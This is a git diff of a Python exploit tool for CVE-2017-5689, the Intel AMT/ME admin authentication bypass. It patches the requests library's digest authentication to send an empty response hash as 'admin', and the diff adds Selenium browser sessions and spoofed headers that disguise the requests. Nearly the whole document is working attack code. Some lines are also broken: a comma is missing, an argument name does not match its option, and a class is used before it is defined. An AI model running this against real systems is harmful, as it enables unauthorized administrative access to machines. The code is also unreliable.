@@ -57,15 +57,12 @@
 ################################################################################
 # WE MODIFY 'response=""' TO BE EMPTY WITH THE USERNAME "ADMIN" THAT IS ALL
 ################################################################################
-
-
 import os
 import argparse
 import requests
-import selenium.webdriver as driver
-from seleniumrequests import Firefox as foxy
-from selenium.webdriver.firefox.options import Options
-
+#import selenium.webdriver as driver
+#from seleniumrequests import Firefox as foxy
+#from selenium.webdriver.firefox.options import Options
 ########################################
 # Stuff for overwriting the digest class
 ########################################
@@ -73,18 +70,14 @@ import re
 import time
 import hashlib
 import warnings
-import selenium
 import threading
-
 from base64 import b64encode
 from requests.compat import urlparse, str, basestring
 from requests.cookies import extract_cookies_to_jar
 from requests._internal_utils import to_native_string
 from requests.utils import parse_dict_header
-
 CONTENT_TYPE_FORM_URLENCODED = 'application/x-www-form-urlencoded'
 CONTENT_TYPE_MULTI_PART = 'multipart/form-data'
-
 #OPTIONS!
 parser = argparse.ArgumentParser(description='Intel IME Admin Bypass Tool, CVE-2017-5689')
 parser.add_argument('--target',
@@ -104,42 +97,76 @@ parser.add_argument('--browser',
                                  help    = "Browser to use (firefox, chrome)" )
 
 arguments = parser.parse_args()
-
 #########################################
 # Stuff for the hack
 #########################################
 url                 = "http://" + arguments.target + ":" + arguments.port
 ime_server_index    = url + "/index.html"
 ime_server_logon    = url + "/logon.html"
-options             = Options()
-browser             = foxy(firefox_options=options)
-useragent           = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'}
-session             = browser.request_session
 #make it seem like we are being sent directly from the logon with every request
-#hacked_headers = { "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-#                    "Accept-Language": "en-US,en;q=0.5",
-#                    "Accept-Encoding": "gzip, deflate",
-#                    "Connection": "close",
-#                    "Referer": ime_server_logon,
-#                    "Upgrade-Insecure-Requests":"1",                   
-#                    "Authorization" : {"Digest username":"admin", 
-#                    "realm":"Digest:72C40000000000000000000000000000", 
-#                    "nonce":"YfAEBQ0NAAAxAnaU61uzWVtGD3AljIL2", 
-#                    "uri": page_request, 
-#                    "response":"",
-#                    "qop":"auth" ,
-#                    "nc":"00000001" , 
-#                    "cnonce":"37ecc61ccd85a088"}}
+useragent           = 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'
+sneaky_headers = { "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    'User-Agent' : useragent,
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "close",
+                    "Referer": ime_server_logon,
+                    "Upgrade-Insecure-Requests":"1",                   
+                    }
 
-# step one:
-# modify a python library to hack things
+# Setup the seleniumrequests mixin meta classes
+# Start a Selenium Session
+if re.search(r'\bfirefox\b', arguments.which_browser, re.I):
+    from seleniumrequests.request import RequestMixin
+    from selenium.webdriver import firefox as Foxy
+    
+    class Fox_in_a_car(Foxy, RequestMixin):
+        pass
+    
+    browser = Fox_in_a_car()
+    #now we can do things with a browser
 
-# step two:
-#begin authentication
-index = requests.get(url, auth=HTTPDigestAuth('admin', 'Does_it_really_matter'))
+    #this is for another type of selenium ... thing?
+    #from seleniumrequests import Firefox as foxy
+    #from selenium.webdriver.firefox.options import Options
+    #options  = Options()
+    #browser  = foxy(firefox_options=options)
+    #browser  = foxy()
+
+elif re.search(r'\bchrome\b', arguments.which_browser, re.I):
+    from seleniumrequests.request import RequestMixin
+    from selenium.webdriver import chrome as Shiny
+    
+    class Shiny_and_chrome(Shiny, RequestMixin):
+        pass
+    
+    browser = Shiny_and_chrome()
+    #now we can do things with a browser
+    
+    #this is for another type of selenium ... thing?  
+    #from seleniumrequests import Chrome as Shiny
+    #from selenium.webdriver.chrome.options import Options
+    #options  = Options()
+    #browser  = Shiny(chrome_options=options)
+    #browser = Shiny()
+
+# begin authentication
+index = browser.request("GET",
+                        url, 
+                        auth=HTTPDigestAuth('admin', 'Does_it_really_matter')
+                        headers = sneaky_headers
+                    
+                    
+                    )
 #the response SHOULD be the index_page
 
 
+
+#class DigestAuthHack(HTTPDigestAuth):
+#    pass
+
+
+    
 class AuthBase(object):
     """Base class that all auth implementations derive from"""
 
@@ -260,6 +287,7 @@ class HTTPDigestAuth(AuthBase):
         # XXX should the partial digests be encoded too?
         ##############################
         #INSERT HACK
+        ## It's SUPPOSED to be empty!
         if self.desired_hash_response == None:
             respdig = ""
         #############################
